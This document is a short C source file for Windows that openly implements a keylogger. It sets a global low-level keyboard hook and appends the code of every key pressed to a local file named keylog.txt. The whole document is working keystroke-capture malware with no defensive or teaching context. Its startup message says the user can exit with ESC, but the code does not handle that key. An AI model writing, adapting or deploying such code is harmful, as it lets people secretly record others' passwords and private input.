#include <windows.h>
#include <stdio.h>

HHOOK hHook;
FILE *logFile;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = kbd->vkCode;

        logFile = fopen("keylog.txt", "a+");
        if (logFile) {
            fprintf(logFile, "%d ", vkCode); // Raw key code
            fclose(logFile);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    MSG msg;

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hHook) {
        printf("Failed to install hook!\n");
        return 1;
    }

    printf("Keylogger started. Press ESC to exit.\n");

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}
